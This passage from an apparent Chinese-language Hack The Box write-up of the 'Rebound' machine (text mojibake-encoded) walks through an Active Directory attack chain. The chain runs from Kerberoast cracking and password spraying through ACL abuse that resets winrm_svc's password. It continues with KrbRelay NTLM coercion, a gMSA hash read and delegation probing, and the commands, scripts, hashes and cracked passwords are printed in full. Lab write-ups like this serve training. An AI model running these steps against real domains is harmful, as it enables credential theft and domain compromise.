[SNIP]$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$ae249e49df17fddc5c790e16e8c3a3f4$0e96f83125e9e6f96f38a69e5e0e3d116d1d54965b900e211ebe077105cf5cb7c26871c34629fc331b4d5698d41c68b2afdd495b454fa80f3a773642e5e52bd5d2d5b321a3ef5c5b639c7a751f3b1e294310f8067696ff6ea04fe57465eb511f988ad2260865776498ee496a5aad8dca5d021d889d3dc82674b64a98a2f1083632bfa9551db5c539c8f4891e8fc019ab40eed0435549f329ddeb52811afbd2dcc70d5bba15828c0061ef914e6d1734ecb64a8206efd4acffb74c48ef78de374aadd88b35ac971bfa5cc3a28549bc43ed0719746856e8b6c3bf7c1781dd76688212c38d5aae9a020b7066300415f7b1d5bf816b830dacd7c2ab2a7c08a409aef9de39dc1da0d5e4c4a33aa32e0b9647cd2ba04a602676d6b8e8ed219f3658acd31ac4c5900f98c05f4decb648eb9a68aed59b6b079660848d706abea1a2f1d9fabc05a463e9da91e74b0fa0ba0b4f47fb5c1fe3531c35c33dd2dca4af79e974264488362b47f9a93f0c8ef07b31d329dcf13cc2a2eaa95c3b14043a8c76c54ff153acaf114259ae901862de0f325fa697101b768160d4f2aec42a1b8a869121cde74a4f70216201bee6ab097e91d4dfee03bf6554bf98f1956efa5b87acb8f0930274a84c12e4b80c30886f2ea48f31e63ecf65153267e5a29a86f9e8e2f1fe61465fb10986a0b5e1c20b504cbce218445e7311f31a6c5376de54b01a9bc96c3e19112915165910ec1327ac1c095280b6d3dda67fc0cb9336376bf1f575fa25c14c1c76372e1d5e03b8355275ba4aafb9d6eae4c18870ca561eb7a6669eca6bab0bdc632fcca98440e9a56e5371086289c06f22dca73bf5779e0826e546602fb518dde1681b05c57fcab6fdf8c453fac4ccb5c427815a79fc7104fd8b193644cf983cedf1f4f34b92c7e5179b852c983f807b83da3c73b4d327f41e8124bb7c482e0bec7b3a26eed116246176b820b171cab3410fe535cad9f573892408e0d04588d9a01f64f27e115e055875b23ee1dcd85731db11f789c41ef858c63cae65c9badee3b0b90e33b63052c042f0de35e8057ee8bf5f677c968d6b0a8dc16182c36cf2f8693b004be6e9960733936ff711f2140da1cbcbedc2d79ba980cdaf26cfe41f09d0387b8e7d4f49bb4462bab64eec8587bdb7502281e25788894690fb6e696ca21d1a51b56286816c3e39d124b4c8640172a3739b799ab785019034f89f93c243ef9ee13c1b915aef5402ef597c9753dc86a945764cb8bf467bdbe33597fb8202f3d066912e2645b366f8770aa3598dcadb780978de2508439114ae3a746e53dad92514022ad1d7dbe0d0a0645e38a15452d7b505d4c22f86af8cd60536ef55[SNIP] åˆ†åˆ«è¿”å›äº†krbtgtï¼ŒDC01$,delegator$å’Œldap_monitorçš„STï¼›ç ´è§£krbtgtå’ŒDC01$çš„STä¸å¤ªç°å®ï¼Œdelegator$ä¸€çœ‹å°±æ˜¯ä¸€å°æœºå™¨è´¦æˆ·ï¼Œå¦‚æœæœºå™¨è´¦æˆ·è®¾ç½®äº†Lapsï¼Œæƒ³å»ç ´è§£ä¹Ÿå‡ ä¹ä¸å¤ªç°å®ï¼›ä½†æ˜¯â€ldap_monitorâ€ä¼¼ä¹æ˜¯é€šè¿‡â€jjonesâ€ç”¨æˆ·æ³¨å†Œçš„ä¸€ä¸ªldapæœåŠ¡è´¦æˆ· æˆåŠŸç ´è§£å‡ºldap_monitorçš„å¯†ç  12345678910â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ john ldap_monitor.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status1GR8t@$$4u (?) 1g 0:00:00:05 DONE (2024-09-11 12:39) 0.1980g/s 2582Kp/s 2582Kc/s 2582KC/s 1Gobucs!..1DENAUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. ldap_monitor:1GR8t@$$4uå‡­æ®åœ¨SMBå…¶æ•ˆæœï¼Œåœ¨winrmæ²¡æœ‰ååº”(çŒœæµ‹ldap_monitorä¸åœ¨è¿œç¨‹ç®¡ç†ç»„ä¸­)ï¼Œè€Œä¸”SMBæœåŠ¡æšä¸¾ä¸€ç•ªï¼Œå¹¶æ²¡æœ‰æ”¶è· 123456789101112131415161718192021222324â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ crackmapexec smb 10.10.11.231 -u ldap_monitor -p '1GR8t@$$4u' SMB 10.10.11.231 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)SMB 10.10.11.231 445 DC01 [+] rebound.htb\\ldap_monitor:1GR8t@$$4u â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ crackmapexec winrm 10.10.11.231 -u ldap_monitor -p '1GR8t@$$4u' SMB 10.10.11.231 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)HTTP 10.10.11.231 5985 DC01 [*] http://10.10.11.231:5985/wsmanWINRM 10.10.11.231 5985 DC01 [-] rebound.htb\\ldap_monitor:1GR8t@$$4u â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ crackmapexec smb 10.10.11.231 -u ldap_monitor -p '1GR8t@$$4u' --sharesSMB 10.10.11.231 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)SMB 10.10.11.231 445 DC01 [+] rebound.htb\\ldap_monitor:1GR8t@$$4u SMB 10.10.11.231 445 DC01 [+] Enumerated sharesSMB 10.10.11.231 445 DC01 Share Permissions RemarkSMB 10.10.11.231 445 DC01 ----- ----------- ------SMB 10.10.11.231 445 DC01 ADMIN$ Remote AdminSMB 10.10.11.231 445 DC01 C$ Default shareSMB 10.10.11.231 445 DC01 IPC$ READ Remote IPCSMB 10.10.11.231 445 DC01 NETLOGON READ Logon server share SMB 10.10.11.231 445 DC01 Shared READ SMB 10.10.11.231 445 DC01 SYSVOL READ Logon server share Password Sprayç”±äºâ€1GR8t@$$4uâ€æ˜¯ä¸€ä¸ªæœåŠ¡è´¦æˆ·çš„å¯†ç ï¼Œå°è¯•å¯†ç å–·æ´’ï¼Œå¯†ç åœ¨â€oorendâ€ç”¨æˆ·ä¸ŠåŒæ ·èµ·æ•ˆï¼Œä½†æ˜¯ä»ç„¶æ— æ³•é€šè¿‡winrmæ‹¿åˆ°shell,smbä¹Ÿæ²¡æœ‰æ”¶è· 12345678910111213141516171819â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ crackmapexec smb 10.10.11.231 -u username.txt -p '1GR8t@$$4u' --continue-on-successSMB 10.10.11.231 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)SMB 10.10.11.231 445 DC01 [-] rebound.htb\\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\llune:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [+] rebound.htb\\ldap_monitor:1GR8t@$$4u SMB 10.10.11.231 445 DC01 [+] rebound.htb\\oorend:1GR8t@$$4u SMB 10.10.11.231 445 DC01 [-] rebound.htb\\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE SMB 10.10.11.231 445 DC01 [-] rebound.htb\\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE æ»¥ç”¨ACLé€šè¿‡bloodhoundæ¥æŸ¥çœ‹åŸŸå†…ä¿¡æ¯ 12sudo ntpdate -s rebound.htb bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc dc01.rebound.htb --zip -c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -ns 10.10.11.231 â€œoorendâ€å¯¹â€servicemgmtâ€ç»„æœ‰â€œselfâ€æƒé™ï¼Œè¿™æ„å‘³ç€ï¼Œâ€oorendâ€å¯ä»¥å°†è‡ªèº«æ·»åŠ åˆ°â€servicemgmtâ€ç»„ä¸­ï¼› â€œservicemgmtâ€ç»„å¯¹â€service usersâ€æœ‰ç€â€genericallâ€æƒé™ï¼›è¿™æ„å‘³ç€ï¼Œæˆ‘å¯ä»¥æ›´æ”¹æˆ–æ·»åŠ â€service usersâ€OUçš„acl â€œwinrm_svcâ€åœ¨â€service usersâ€OUä¸­ï¼Œè¿™æ„å‘³ç€ï¼Œæˆ‘å¯ä»¥ä½¿å¾—oorendç”¨æˆ·å¯¹â€service usersâ€æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œé‚£ä¹ˆoorendå°±å¯ä»¥å»ä¿®æ”¹â€winrm_svcâ€ç”¨æˆ·çš„å¯†ç ï¼› è„šæœ¬å¦‚ä¸‹ 12345678910111213141516171819#ï¼/bin/bashdcip=10.10.11.231sudo ntpdate -s $dcipecho &quot;Getting oorend ticket&quot;impacket-getTGT rebound.htb/oorend:'1GR8t@$$4u'export KRB5CCNAME=oorend.ccacheecho &quot;Adding oorend to servicemgmt group&quot;bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember ServiceMGMT oorendecho &quot;Writing dacl&quot;bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorendecho &quot;Changing winrm_svc password&quot;bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'LeetPassword123!' 123456789101112â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ bash poc.sh Getting oorend ticketImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Saving ticket in oorend.ccacheAdding oorend to servicemgmt group[+] oorend added to ServiceMGMTWriting dacl[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTBChanging winrm_svc password[+] Password changed successfully! æˆåŠŸä¿®æ”¹â€winrm_svcâ€ç”¨æˆ·çš„å¯†ç ä¹‹åï¼Œæˆ‘å°±å¯ä»¥ç”¨â€LeetPassword123!â€å¯†ç é€šè¿‡winrmè¿æ¥ï¼Œå› ä¸ºâ€winrm_svcâ€å±äºâ€remote management usersâ€ç»„ä¸­ï¼Œè¿™ä¸€ç‚¹å¯ä»¥åœ¨bloodhoundä¸­çœ‹åˆ°ï¼› 123456789101112â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ evil-winrm -i 10.10.11.231 -u winrm_svc -p 'LeetPassword123!' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents&gt; whoamirebound\\winrm_svc ææƒCross-sessionè™½ç„¶æ‹¿ä¸‹winrm_svcï¼Œä»ç„¶ä¸èƒ½åˆ©ç”¨â€CanPSRemoteâ€åˆ°åŸŸæ§æœºå™¨ï¼Œå› ä¸ºè¿™ä¸ªåˆ©ç”¨æ‰‹æ³•æ˜¯éœ€è¦å‡­æ®çš„ï¼Œå¯ä»¥ä»CanPSRemoteäº†è§£åˆ° æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œæœ‰ä¸€äº›æœ‰è¶£çš„äº‹æƒ…,session 1 ä¸­æœ‰ä¸€å †è¿›ç¨‹ã€‚é€šå¸¸åœ¨ HTB è®¡ç®—æœºä¸Šï¼Œå½“æ²¡æœ‰äººç™»å½•æ—¶ï¼Œæˆ‘ä¼šçœ‹åˆ°LogonUIå’Œå…¶ä»–å‡ ä¸ªè¿›ç¨‹ï¼Œä½†è¿™é‡Œexploreræ­£åœ¨è¿è¡Œï¼Œè€Œä¸”çœ‹èµ·æ¥æœ‰äººç¡®å®ç™»å½•äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents&gt; get-processHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 395 33 12696 21332 2828 0 certsrv 480 19 2244 5492 392 0 csrss 274 16 2228 5300 504 1 csrss 357 15 3476 15000 5868 1 ctfmon 401 33 16376 25236 2928 0 dfsrs 189 13 2388 8204 1836 0 dfssvc 290 14 3848 13808 3876 0 dllhost 5374 4793 69020 71240 2968 0 dns 601 25 24480 52216 60 1 dwm 1505 59 25076 89616 5312 1 explorer 53 6 1788 5444 2804 1 fontdrvhost 53 6 1504 4728 2812 0 fontdrvhost 0 0 56 8 0 0 Idle 142 14 2224 6096 2984 0 ismserv 2390 188 55980 74420 656 0 lsass 492 36 52016 64604 2836 0 Microsoft.ActiveDirectory.WebServices 254 13 2912 10840 4152 0 msdtc 646 92 305660 323116 2504 0 MsMpEng 110 7 1276 6892 1692 1 PickerHost 158 10 1612 8700 6676 1 PickerHost 0 14 320 21272 88 0 Registry 235 12 2704 17160 2588 1 RuntimeBroker 293 15 5656 17056 6192 1 RuntimeBroker 231 12 2320 12932 6572 1 RuntimeBroker 672 32 19596 72168 5660 1 SearchUI 276 12 2836 12528 2172 0 SecurityHealthService 628 14 5668 13520 636 0 services 783 30 16972 60172 2524 1 ShellExperienceHost 454 17 5080 25200 5544 1 sihost 53 3 528 1228 288 0 smss 329 15 5312 13996 332 0 svchost 209 12 1672 7540 488 0 svchost 158 9 1864 7000 508 0 svchost 137 17 3440 7812 768 0 svchost 89 5 904 4012 848 0 svchost 215 12 1972 10132 864 0 svchost 939 21 6980 23168 868 0 svchost 918 20 5320 13128 916 0 svchost 257 10 2004 7952 956 0 svchost Session IDï¼ˆä¼šè¯æ ‡è¯†ç¬¦ï¼‰ æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­ä¸ºæ¯ä¸ªç”¨æˆ·ä¼šè¯åˆ†é…çš„å”¯ä¸€æ ‡è¯†ç¬¦;æ¯ä¸ªç”¨æˆ·åœ¨ç™»å½•æ—¶éƒ½ä¼šåˆ†é…ä¸€ä¸ªä¼šè¯ IDï¼ŒWindows ä¼šåŒºåˆ†æ¯ä¸ªç™»å½•ç”¨æˆ·çš„ä¼šè¯ï¼Œå¹¶éš”ç¦»æ¯ä¸ªç”¨æˆ·çš„è¿›ç¨‹ã€‚0 è¡¨ç¤ºçš„æ˜¯ Session 0ï¼Œé€šå¸¸è¡¨ç¤ºä¸ç³»ç»ŸæœåŠ¡ç›¸å…³çš„è¿›ç¨‹ï¼Œå› ä¸ºç³»ç»ŸæœåŠ¡é€šå¸¸åœ¨ä¼šè¯ 0 ä¸­è¿è¡Œï¼Œè€Œæ™®é€šç”¨æˆ·çš„äº¤äº’å¼è¿›ç¨‹åˆ™åœ¨ä¸åŒçš„ä¼šè¯ä¸­ã€‚ qwinstaæ˜¯æ˜¾ç¤ºæœ‰å…³ä¼šè¯ä¸»æœºçš„ä¿¡æ¯çš„å‘½ä»¤ï¼Œä½†å®ƒå¤±è´¥;é‡åˆ°äº†è¿™ç¯‡ Security Stack Exchange å¸–å­ï¼Œå®ƒæ²¡æœ‰è§£é‡ŠåŸå› ï¼Œä½†è¡¨æ˜RunasCs.exeå¯ä»¥ä½¿å…¶å·¥ä½œ; 12345*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents&gt; .\\RunasCs.exe oorend '1GR8t@$$4u' -l 9 &quot;qwinsta&quot; SESSIONNAME USERNAME ID STATE TYPE DEVICE&gt;services 0 Disc console tbrady 1 Active æ˜¾ç¤º TBrady ç”¨æˆ·å·²ç™»å½•; ä½¿ç”¨runasCså’ŒKrbRelayçš„ç»„åˆï¼Œå¯ä»¥å¼ºåˆ¶æ¥è‡ªtbradyçš„è¿æ¥ï¼Œè¿™å°†ç”Ÿæˆhashã€‚ä¸ºæ­¤ï¼Œé€šè¿‡-ntlmæŒ‡å®šNTLMèº«ä»½éªŒè¯ï¼Œé€šè¿‡-sessionæŒ‡å®šsessionå·ï¼Œå¹¶ä¸ºå…·æœ‰æ­£ç¡®æƒé™çš„æœ‰æ•ˆRPCæœåŠ¡æŒ‡å®šCLSIDï¼Œä»READMEä¸Šåˆ—å‡ºçš„é»˜è®¤å€¼ä¸­é€‰æ‹© 1234567891011121314151617181920212223242526*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents&gt; .\\RunasCs.exe x x -l 9 &quot;C:\\Users\\winrm_svc\\Documents\\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&quot;[*] Auth Context: rebound\\tbrady[*] Rewriting function table[*] Rewriting PEB[*] GetModuleFileName: System[*] Init com server[*] GetModuleFileName: C:\\Users\\winrm_svc\\Documents\\KrbRelay.exe[*] Register com serverobjref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAAqpryRm+AzL/k6uK/3ZCn9AogAAFAP///S8mcCLJPf9yIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:[*] Forcing cross-session authentication[*] Using CLSID: 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4[*] Spawning in session 1[*] NTLM14e544c4d535350000100000097b218e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44[*] NTLM24e544c4d53535000020000000e000e003800000015c299e21853ef0e432bfe50000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080041dbca167204db010000000000000000000000005c00410070007000490044005c004b00000000000b000000[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons[*] NTLM3tbrady::rebound:1853ef0e432bfe50:482b499708d53799e6e59dd60a1a7894:010100000000000041dbca167204db01e648a7f8ca8ef5e60000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080041dbca167204db0106000400060000000800300030000000000000000100000000200000a35c1be83964849fb83b4ee054d903d3e13eab8900e2d37f226c3313a120c7440a00100000000000000000000000000000000000090000000000000000000000System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)) at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid&amp; pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults) at KrbRelay.Program.Main(String[] args) æˆåŠŸè¿”å›äº†â€tbradyâ€ç”¨æˆ·çš„Net-ntlm hashï¼Œå°è¯•ç”¨johnç ´è§£ 12345678910â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ john tbrady.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status543BOMBOMBUNmanda (tbrady) 1g 0:00:00:04 DONE (2024-09-11 13:44) 0.2398g/s 2923Kp/s 2923Kc/s 2923KC/s 5449977..5435844Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably å¯ä»¥æˆåŠŸç ´è§£ï¼Œæ‹¿åˆ°â€tbradyâ€ç”¨æˆ·çš„å¯†ç â€543BOMBOMBUNmandaâ€ æ»¥ç”¨ACLåœ¨bloodhoundä¸­åˆ†æâ€tbradyâ€ç”¨æˆ·ï¼Œå‘ç°æ­¤ç”¨æˆ·å¯ä»¥è¯»å–ä¸€ä¸ªåä¸ºâ€delegator$â€çš„æœºå™¨è´¦æˆ·çš„å¯†ç  å€ŸåŠ©â€bloodyADâ€å·¥å…·åˆ©ç”¨â€tbradyâ€çš„å‡­æ®è¯»å–â€delegator$â€çš„ntlm hash; 1234567â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassworddistinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htbmsDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:f7f7ea94cd22bd4129ca00bab335ceb9msDS-ManagedPassword.B64ENCODED: ZhCKwN40T+v50IN1lFCkGOApU8008D+oW99yDAjZIaB1sRThOkiMLh2XW/vtZS0+ZJmP41rOCKmZSsMohCCwqJRLFC7jWFtgiFlt4eOJaTMAQcF1JVbhhXdfYf9tgxXGmeNHcjjybJPKmzpN8pc5HB1Ax8rau9Fj4myZUHTGd/+Gx96XeLGHJQ1wOyTcyRHSleSl8NREUiDNtJ5jhfpYO32TyRmXdDPY1a8ny6JsgZGyZgBeOAXnbXWaOBNl7D6FYSbQ8K0+yNjS120QUbZE/p2DASXBGIlYH0C5kLjEfP5Tu0RIOZop2vm1fU58pHfU3spUboWpbVGfx+2hEj0erQ== constrained Without protocol transitionä»bloodhoundä¸­å¹¶ä¸èƒ½çœ‹åˆ°å¦‚ä½•ä»â€delegator$â€æ¨ªå‘ç§»åŠ¨çš„è·¯å¾„ï¼Œä½†ä»æœºå™¨åå­—æ¥çœ‹ï¼Œä¸éš¾çŒœæµ‹ï¼Œè¿™å°æœºå™¨è´¦æˆ·å’Œå§”æ´¾ç›¸å…³ï¼› é€šè¿‡â€™â€findDelegation.pyâ€æŸ¥çœ‹åŸŸå§”æ´¾ç›¸å…³ä¿¡æ¯ï¼›ä¸€çœ‹â€™â€delegator$â€å¯¹åŸŸæ§å®ç°äº†çº¦æŸå§”æ´¾ 12345678910â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ findDelegation.py rebound.htb/oorend:'1GR8t@$$4u' -dc-ip dc01.rebound.htb -kImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Getting machine hostname[-] CCache file is not found. Skipping...[-] CCache file is not found. Skipping...AccountName AccountType DelegationType DelegationRightsTo SPN Exists ----------- ----------------------------------- -------------- --------------------- ----------delegator$ ms-DS-Group-Managed-Service-Account Constrained http/dc01.rebound.htb No ä¸å¯èƒ½ç”¨ç»å…¸çš„â€getSTâ€æ¥æ»¥ç”¨çº¦æŸå§”æ´¾ï¼Œ å› ä¸ºæ­¤çº¦æŸå§”æ´¾è®¾ç½®çš„æ˜¯â€ä»…ä½¿ç”¨Kerberosâ€ï¼Œè¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡s4u2selfç”³è¯·çš„STæ˜¯å¦å¯è½¬å‘æ¥åˆ¤æ–­ ä¸ºäº†æ¼”ç¤ºè¿™ä¸€ç‚¹ï¼Œè¿è¡ŒgetST.pyå¤±è´¥: 123456789101112â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ getST.py -spn http/dc01.rebound.htb -impersonate administrator 'rebound.htb/delegator$' -hashes :f7f7ea94cd22bd4129ca00bab335ceb9Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[-] CCache file is not found. Skipping...[*] Getting TGT for user[*] Impersonating administrator[*] Requesting S4U2self[*] Requesting S4U2Proxy[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable å®ƒä½¿ç”¨ S4U2Self ä¸º delegator$ è·å–ç®¡ç†å‘˜ç”¨æˆ·çš„ç¥¨è¯ï¼Œç„¶åå°è¯•ä½¿ç”¨ S4U2Proxy è½¬å‘å®ƒï¼Œä½†å®ƒå¤±è´¥äº†(å› ä¸ºSTä¸å¯è½¬å‘)ï¼› -selfæ ‡å¿—å‘Šè¯‰getSt.pyåœ¨ S4U2Self ä¹‹ååœæ­¢ï¼Œä¸º delegator$ è·å–ç®¡ç†å‘˜ç¥¨è¯ã€‚ç”Ÿæˆçš„ç¥¨è¯ç¼ºå°‘å¯è½¬å‘æ ‡å¿—ï¼š 12345678910â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ getST.py -spn http/dc01.rebound.htb -impersonate administrator 'rebound.htb/delegator$' -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -selfImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[-] CCache file is not found. Skipping...[*] Getting TGT for user[*] Impersonating administrator[*] When doing S4U2self only, argument -spn is ignored[*] Requesting S4U2self[*] Saving ticket in administrator@delegator$@REBOUND.HTB.ccache å¯ä»¥çœ‹åˆ°â€Flagsâ€å­—æ®µä¸­ç¼ºå°‘äº†â€forwardableâ€æ ‡å¿—ï¼Œè¯´æ˜æ­¤STæ˜¯ä¸å¯è½¬å‘çš„ 12345678910111213141516171819202122232425â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ describeTicket.py administrator@delegator\\$@REBOUND.HTB.ccacheImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Number of credentials in cache: 1[*] Parsing credential[0]:[*] Ticket Session Key : b133b264334cd7f13231a428b4f68ec8[*] User Name : administrator[*] User Realm : rebound.htb[*] Service Name : delegator$[*] Service Realm : REBOUND.HTB[*] Start Time : 11/09/2024 14:04:26 PM[*] End Time : 12/09/2024 00:04:26 AM[*] RenewTill : 12/09/2024 14:02:13 PM[*] Flags : (0xa10000) renewable, pre_authent, enc_pa_rep[*] KeyType : rc4_hmac[*] Base64(key) : sTOyZDNM1/EyMaQotPaOyA==[*] Kerberoast hash : $krb5tgs$18$USER$REBOUND.HTB$*delegator$*$72b47c0ffdda4f1189e3a591$17cf8b3c216070235c1ed1a2f89e82d3a11264f7fc2c09a64b170d80a8908d7832d30e50d4467e0c83a7185b6d6be2c0acf9e55b906114af9f4adb11cf92c7cf9990452513b61bc8dcd8431ba8f537ef5aa1208a586bde16aed4c6def820f425dbcd4aeacfc6a4255f228e3ab205f073bce134869658a43e564494e38bd5dc73f01f52af6103196264484bd839cfc552678c0d6c247ea201f9bb3143bcff96e7f926d1dde3cc52e4a3edbc2aa00301748625883be58be7de90f7e012ea526f6d728321421bb7a407f59667308fad2aa27c927736c3205224a59ec73408639c96daf54690ad1ef0167e440f96ef13fca66dcf8de12f83188347df018fd0b74e6e3431ddb3e0979b93b7f98ddb9fbe31d2372beade3aeb4fc923f36ba4bf259f4c71510c414716a59cefd5588c97381ab68551a17d32ba0b3d4b10ebf1e6c5ca134a721d411f4bdc890f97eca5e03b2e9d6be82f133a21ba68ce6f88d84d503fc460ce6f639ba64d3feaee2f09fb71238b6da2e2b9158bc358a4ded351453be6b9f6a4df8f32ed9043d37f9943481eca1f8d9df54e5a44806d6ddc882a67b7d571e7678485289ef351973327037dc7b5c631260d27fc14994a8c4a80c8ab8127a15b8bb053b213dba116267778d52b111c49ab2b12954cfd1ebc07c579059933242d46789b2b4d8e8b1899625f51603211d7ed2e2f2c09ca797b1a335acb5097159bc25a0b5ff297849aabefde4e4b5b5285f48989842f618c25442d84d25c40a13bea29446f2aafedda8180e68cf6ff7a7ed16a0e518c69dfda418aae6bdb59bd59b6dc240e41446252ca499408e2ae49b43505b44db6bd393876bc128a572bd0489b7a5f05848b7903fe6d20620bed7c7a23cc82af781f61729d682f30005ca4dda90f9298f5508ce85ab2bbf71341219cc9873ad0cb1c2ba5c4168174200d4ef4db68e3e5a96d09eb5f4b881f5cb2206cf446577472db46bd07731431a5c243c894972c5d3d64eda29b77df28acaa4caaa841dc35857b2f474ba55401b52afec5ce55b61b5bcb3762b2911f9e14d211b273358698a18cbe9adff7187867b9f9ef4373787fa3659a70e7a28d40b33070d4cb1057fe518063f27604333371710a60c75143148802bd75fecd48d278459d59fd7672e164266